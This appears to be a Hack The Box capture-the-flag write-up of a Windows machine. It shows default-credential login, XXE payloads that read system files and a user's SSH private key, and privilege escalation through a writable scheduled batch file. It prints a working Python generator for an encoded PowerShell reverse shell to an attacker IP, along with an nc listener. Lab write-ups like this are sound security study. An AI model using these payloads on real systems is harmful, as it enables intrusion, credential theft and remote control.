---
tags:
  - Linux
  - HTTP
  - Weak credentials
  - XXE
  - Cron-job
---

... is a simple HTB machine which offers a web service which hides a `XXE` vulnerability behind default credentials. These can be used to steal the `ssh` key of a user. To gain elevated privileges, a script which is scheduled to run can be modified. 

### Reconnaissance
The tool `nmap` is used to do the initial reconnaissance of any target, as it very reliably sends packets to specific ports of the target to verify if they are open, closed, or filtered. The following command is used as a standard `nmap` scan:
```bash
sudo nmap -sCV $IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# sudo: optional, but makes the scan a bit faster and stealthier, as no TCP connect() is used.
# -sC (or --script=default): uses the default scripts of nmap. can quickly discover simple vulnerabilities, such as anonymous logins.
# -sV: further scans open ports to determine the actual service which is running on them, as an open port 80 does not directly imply a HTTP service.
```

the output of `nmap` tells us this:
```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
```
This again shows a very typical setup of a HTB machine where a web application mis-configuration leads to `ssh` credentials.

### Initial Exploitation
Both the `http` and `https` service display a login form, with the footer telling you that it's `Powered by Megacorp`. After looking at the `HTML` source and the developer tools, i try some default credential pairs such as `admin:admin`, `root:root`, ... The combination of `admin:password` gets me to the `home.php` endpoint.

There are multiple tabs after logging in, but the only one that accepts user input and does anything is the `Order` tab. The `HTML` source also shows a very interesting comment:
```html
<!-- Modified by Daniel : UI-Fix-9092-->
```
This tells us that there is a `daniel` which interacts with the server. Maybe he has an account on the system.

The `Order` tab offers a form to order goods in bulk. After filling out the form with placeholder values and pressing the submit button, i see that a `POST` request is made to the `process.php` endpoint using `XML`:
```xml
<?xml version = "1.0"?>
	<order>
		<quantity>
			6
		</quantity>
		<item>
			Home Appliances
		</item>
		<address>
			123123
		</address>
	</order>
```
When the user controls `XML` values which the server receives, it is always crucial to test for `XXE` (`XML External Entity`) attacks. To identify this vulnerability, i try to request a resource which i provide using `python3 -m http.server 1337`. The following payload uses a `DTD` to reference an entity which exists on my machine:
```xml
<?xml version = "1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://<my-ip>:1337/test"> ]>
	<order>
		<quantity>
			2
		</quantity>
		<item>
			&xxe;
		</item>
		<address>
			123123
		</address>
	</order>
```
And surely enough, the resource `/test` receives a GET request! Alongside that, multiple errors are returned, which all include the file `C:\xampp\htdocs\process.php`. This is the `PHP` file we are sending `POST` requests to. A valuable piece of information from this error message is that the hosting machine is a windows machine!

As we don't know what the server does with the received resource, it isn't as useful right now. The other thing which is achievable using `XXE` attacks is arbitrary file reads on the target. As we now know that the target is using the Windows operating system, i try to read the `/etc/hosts` file by editing the `DTD` as follows:
```xml
<?xml version = "1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts"> ]>
	<order>
		...
```
And this worked! Because of the comment which was added to the `services.php`, i try to read the flag which is presumably located at:
`C:/Users/daniel/Desktop/user.txt`
This returned me the value of the user flag.

I still need code execution on this machine though. When remembering the `nmap` scan, it also had a `ssh` service. Maybe `daniel` has `ssh` keys stored in his hidden `.ssh` directory. To test this theory, i try to fetch the private key `id_rsa` (default name):
`C:/Users/daniel/.ssh/id_rsa`
Surprisingly, this also worked.

I save the value of the private key in a file called `daniels-key`, and change it's permissions to `400`, as the default ones are too open and will not be accepted. To connect to the server using this file, the `-i` option can be used:
```bash
ssh -i daniels-key daniel@$IP
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -i: provide identity file
```

And this gives me access to the terminal as `daniel`!

### Privilege Escalation
The `whoami /all` command did not show any interesting privileges or groups. That is why i went to the root directory`C:/` to search for directories which stand out. One of them which is not ordinary was the `Log-Management` directory. It holds a single `job.bat` file which shows the following content:
```powershell
@echo off 
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```
What this file does is essentially does is to start the command `bcdedit`, which is a CLI tool to edit boot configuration data. If `bcdedit` command is run as a non-administrator, it returns `Access is denied`. The batch file then saves the first word of the output of `bcdedit`, and compares it against the string `Access`. If the first string of `bcdedit`'s output is `Access`, the batch file assumes that the current user is not an administrator and kicks them out of the shell by using `exit`. If the current user is an admin though, it uses `wevtutil.exe el` (event log enumerate) to list all windows event logs. For each of these entries, the log is cleared using `wevtutil.exe cl <log entry>`.

Executing this `job.bat` tells me that i must be an Administrator to run this script and exits my `ssh` session (as expected...). There are two questions that appear when seeing this batch file:

1. Is this `batch` file being ran as a scheduled task?
2. Can i edit it?

To find the answer to the first question i list the scheduled tasks using `schtasks`. The problem is that i may not be authorized to see this scheduled task, as it does not show up. I could theoretically constantly inspect the output of `ps` and search for the execution of `wevtutil`, but i will just assume that it is being ran as an administrator.
For the second question i need to find a windows alternative to `ls -la`. A quick google search leads me to a superuser question which tells me that `icacls` is the way to go. I see that the `BUILTIN\Users` group has full access (`F`) to this file. `whoami /all` shows me that `daniel` is indeed part of this group!

Now to the editing of the `job.bat`. Windows does not have a built-in CLI file editor such as `vim` or `nano`. I could overwrite the file using the output of `echo`, but it's never a good idea to mess with the intended functionality of scheduled tasks as that may alert administrators. I simply want to add one line to the scheduled task which sends a reverse shell to my machine. That is why i visit the [vim download page](https://www.vim.org/download.php) to download the `gvim_9.2.0000_x64.zip` onto my kali machine and `unzip` it. I then use `ssh`'s `scp` functionality to copy the local vim directory to the remote location (takes a while...):
```bash
scp -i daniels-key -r ./vim daniel@$IP:C:/Log-Management
```
A quicker way of achieving this goal is by sending the `zip` file over `scp`, and unzipping it using this `powershell` command (switch to `powershell` by typing `powershell`):
```powershell
Expand-Archive -Path .\gvim_9.2.0000_x64.zip -DestinationPath .\
```
Now, the file can be edited using:
```powershell
.\vim\vim92\vim.exe .\job.bat
```
> **_NOTE:_** I think it would have been smarter to just upload (`scp`) the edited `job.bat`...

The final step is to add a command which initiates a reverse shell. For this, i like to use the following python script:
```python
#!/usr/bin/env python
import base64
import sys

if len(sys.argv) < 3:
  print('usage : %s ip port' % sys.argv[0])
  sys.exit(0)

payload="""
$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
""" % (sys.argv[1], sys.argv[2])

byte = payload.encode('utf-16-le')
b64 = base64.b64encode(byte)
print("powershell -exec bypass -enc %s" % b64.decode())
```
This simple script takes your `IP` and a `port`, places them into the `powershell` reverse shell initiator (stored in the variable `payload` as a string), encodes the payload in `base64`, and returns a command on the screen which should be executed on the target machine.

The output of this script is inserted somewhere inside the `job.bat` using `vim`. I start the listener like this:
```bash
nc -lvnp 1337
```
<div class="annotate" markdown> (1) </div>

1. 
```bash
# -l: listen for inbound connects
# -v: verbose to get more info
# -n: numeric IP addresses, dont use DNS
# -p: specify listening port (1337)
```

... and wait for the `Administrator` reverse shell (which i receive after ~5 seconds)! The flag can be read using `type C:\Users\Administrator\Desktop\root.txt`.

### Summary

Below is a visualized summary of the exploitation steps used in this machine to gain RCE.

``` mermaid
graph LR
  A[HTTP<br>Service] -->|Weak<br>credentials| B[Back-end<br>access];
  B -->|XXE| C[Daniel's<br>SSH-key];
  C -->|Use| D[SSH-access];
```

The privilege escalation to the user `Administrator` worked as follows:

``` mermaid
graph LR
  A[SSH-access] -->|Write| B[job.bat];
  C[Administrator] -->|Scheduled<br>task| B;
  B --> D[OS-code<br>execution<br>as Administrator];
```